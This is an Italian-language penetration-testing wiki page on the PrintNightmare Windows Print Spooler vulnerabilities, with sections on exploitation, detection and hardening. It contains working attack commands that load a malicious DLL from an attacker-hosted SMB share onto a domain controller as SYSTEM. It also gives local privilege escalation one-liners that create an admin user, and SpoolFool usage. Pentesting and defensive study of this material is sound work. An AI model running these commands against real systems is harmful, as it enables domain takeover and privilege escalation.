# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare è il nome collettivo assegnato a una famiglia di vulnerabilità nel servizio Windows **Print Spooler** che consentono l'**esecuzione arbitraria di codice come SYSTEM** e, quando lo spooler è raggiungibile tramite RPC, l'**esecuzione remota di codice (RCE) sui domain controller e sui file server**. Le CVE sfruttate più frequentemente sono **CVE-2021-1675** (inizialmente classificata come LPE) e **CVE-2021-34527** (RCE completa). Problemi successivi come **CVE-2021-34481 (“Point & Print”)** e **CVE-2022-21999 (“SpoolFool”)** dimostrano che la superficie di attacco è ancora ben lontana dall'essere completamente chiusa.

Se stai cercando la **coercizione dell'autenticazione / relay** tramite lo spooler invece della **RCE/LPE basata sui driver**, consulta [questa pagina sull'abuso della coercizione delle stampanti](printers-spooler-service-abuse.md). Questa pagina è incentrata sul **caricamento di driver / DLL come SYSTEM**.

---

## 1. Componenti vulnerabili e CVE

| Anno | CVE | Nome breve | Primitive | Note |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Corretta nel CU di giugno 2021, ma aggirata da CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` consente agli utenti autenticati di caricare una DLL di un driver da una condivisione remota; dopo agosto 2021 ciò richiede solitamente policy Point & Print indebolite|
|2021|CVE-2021-34481|“Point & Print”|LPE|Installazione di driver non firmati da parte di utenti non amministratori|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Creazione arbitraria di directory → DLL planting – funziona anche dopo le patch del 2021|

Tutte sfruttano uno dei **metodi RPC MS-RPRN / MS-PAR** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) o le relazioni di trust all'interno di **Point & Print**.

## 2. Tecniche di exploitation

### 2.1 Compromissione remota di un Domain Controller (CVE-2021-34527)

Un utente di dominio autenticato ma **non privilegiato** può eseguire DLL arbitrarie come **NT AUTHORITY\SYSTEM** su uno spooler remoto (spesso il DC) tramite:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
I PoC più popolari includono **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) e i moduli `misc::printnightmare / lsa::addsid` di Benjamin Delpy in **mimikatz**.

### 2.2 Local privilege escalation (qualsiasi versione di Windows supportata, 2021-2024)

La stessa API può essere chiamata **localmente** per caricare un driver da `C:\Windows\System32\spool\drivers\x64\3\` e ottenere i privilegi SYSTEM:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 Triage moderno su host patchati

Su un host completamente aggiornato, i PoC pubblici di PrintNightmare spesso falliscono perché Windows ora imposta per impostazione predefinita l'installazione dei driver delle stampanti come consentita solo agli **amministratori** (`RestrictDriverInstallationToAdministrators=1` dal 10 agosto 2021). Prima di lanciare un exploit contro un target, verifica innanzitutto se l'ambiente ha annullato questa modifica di sicurezza per le distribuzioni legacy delle stampanti:
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
I due valori vulnerabili più interessanti sono solitamente:

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Da Linux, verifica rapidamente che il target esponga le interfacce RPC di stampa pertinenti prima di eseguire un PoC:
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
Alcuni strumenti pubblici più recenti offrono anche un flusso di lavoro più sicuro di **check/list** prima di inviare una DLL:
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> Se ottieni `RPC_E_ACCESS_DENIED` (`0x8001011b`) come utente con privilegi ridotti, di solito stai osservando il comportamento predefinito successivo al 2021, non un errore di trasporto.

> Su Windows 11 22H2+ e sulle build client più recenti, la stampa remota utilizza per impostazione predefinita **RPC over TCP** e **RPC over named pipes** (`\PIPE\spoolss`) è disabilitato, a meno che non venga riabilitato esplicitamente. Alcuni PoC meno recenti e appunti di laboratorio presumono ancora che la named pipe sia raggiungibile.

### 2.4 Abuso di Package Point & Print su reti “patched”

Molti ambienti enterprise sono rimasti **vulnerabili per configurazione** dopo le patch originali del 2021, perché i workflow dell'helpdesk o del print server richiedevano ancora agli utenti non amministratori di installare o aggiornare i driver. In pratica, l'approccio offensivo diventa:

- Se i prompt di sicurezza sono completamente disabilitati, il **classico arbitrary-DLL PrintNightmare** rimane il percorso più rapido.
- Se **Only use Package Point and Print** è abilitato, di solito è necessario passare a un percorso basato su un **signed package-aware driver**, invece di eseguire un semplice caricamento di una DLL.
- La ricerca del 2024 ha mostrato che **`Package Point and Print - Approved servers` non costituisce da solo un hard trust boundary**: se un attaccante può spoofare o dirottare la name resolution per un print server approvato, le vittime possono comunque essere reindirizzate a un server malevolo che soddisfa i controlli della policy.
- Anche combinare l'UNC hardening con RPC-over-SMB forzato può essere fragile, perché i client moderni possono **passare a RPC over TCP**.

Per questo motivo, lo sfruttamento moderno in stile PrintNightmare riguarda spesso più l'**abuso della policy di distribuzione delle stampanti enterprise** che la ripetizione invariata del PoC originale del 2021.

### 2.5 SpoolFool (CVE-2022-21999) – bypass delle correzioni del 2021

Le patch Microsoft del 2021 hanno bloccato il caricamento remoto dei driver, ma **non hanno rafforzato i permessi delle directory**. SpoolFool sfrutta il parametro `SpoolDirectory` per creare una directory arbitraria sotto `C:\Windows\System32\spool\drivers\`, deposita una DLL payload e forza lo spooler a caricarla:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> L'exploit funziona su Windows 7 → Windows 11 e Server 2012R2 → 2022 completamente aggiornati prima degli update di febbraio 2022

---

## 3. Rilevamento e hunting

* **Log di PrintService** – abilita il canale *Microsoft-Windows-PrintService/Operational* e monitora **Event ID 316** (driver aggiunto/aggiornato, di solito include i nomi delle DLL) sia nei tentativi riusciti sia in quelli falliti. Abbinalo a **Event ID 808/811** per rilevare errori sospetti nel caricamento di moduli/driver dello spooler.
* **Sysmon** – `Event ID 7` (Image loaded) o `11/23` (File write/delete) all'interno di `C:\Windows\System32\spool\drivers\*` quando il processo padre è **spoolsv.exe**.
* **Process lineage** – genera un alert ogni volta che **spoolsv.exe** avvia `cmd.exe`, `rundll32.exe`, PowerShell o qualsiasi processo figlio non firmato imprevisto.
* **Network telemetry** – recuperi SMB imprevisti da `spoolsv.exe` verso share controllate dall'attaccante o traffico RPC anomalo relativo alle stampanti proveniente da server che non dovrebbero comportarsi come print server sono entrambi indicatori ad alta affidabilità.

## 4. Mitigazione e hardening

1. **Applica le patch!** – applica l'ultimo cumulative update su ogni host Windows che ha installato il servizio Print Spooler.
2. **Disabilita lo spooler dove non è necessario**, soprattutto sui Domain Controller:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Blocca le connessioni remote** consentendo comunque la stampa locale – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Mantieni Point & Print riservato agli amministratori** impostando:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Indicazioni dettagliate in Microsoft KB5005652
5. Se i requisiti aziendali impongono `RestrictDriverInstallationToAdministrators=0`, considera ogni altra policy relativa alle stampanti **solo una mitigazione parziale**. Come minimo, preferisci **package-aware drivers**, abilita **Only use Package Point and Print** e limita **Package Point and Print - Approved servers** a print server espliciti presenti nell'forest.
6. **Non ripristinare la privacy dell'RPC delle stampanti** solo per correggere mapping di stampanti non funzionanti. Gli ambienti che impostano `RpcAuthnLevelPrivacyEnabled=0` stanno annullando l'hardening aggiunto per **CVE-2021-1678** e durante un engagement meritano generalmente un'attenzione aggiuntiva.

---

## 5. Research / tools correlati

* Moduli [`mimikatz `printnightmare``](https://github.com/gentilkiwi/mimikatz/tree/master/modules)
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – implementazione standard di Impacket con modalità `-check`, `-list` e `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper con SMB delivery integrato, supporto multi-target ed entrambe le modalità `MS-RPRN` / `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – abuso di un driver vulnerabile per stampanti fornito dall'attaccante tramite package Point & Print
* Exploit e write-up di SpoolFool
* Micropatch di 0patch per SpoolFool e altri bug dello spooler

Se vuoi **coercere l'autenticazione** tramite lo spooler invece di caricare un driver, vai a [printer spooler service abuse](printers-spooler-service-abuse.md).

---

## Riferimenti

* Microsoft – *KB5005652: Manage new Point & Print default driver installation behavior*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
* itm4n – *A Practical Guide to PrintNightmare in 2024*
<https://itm4n.github.io/printnightmare-exploitation/>
* itm4n – *The PrintNightmare is not Over Yet*
<https://itm4n.github.io/printnightmare-not-over/>
{{#include ../../banners/hacktricks-training.md}}
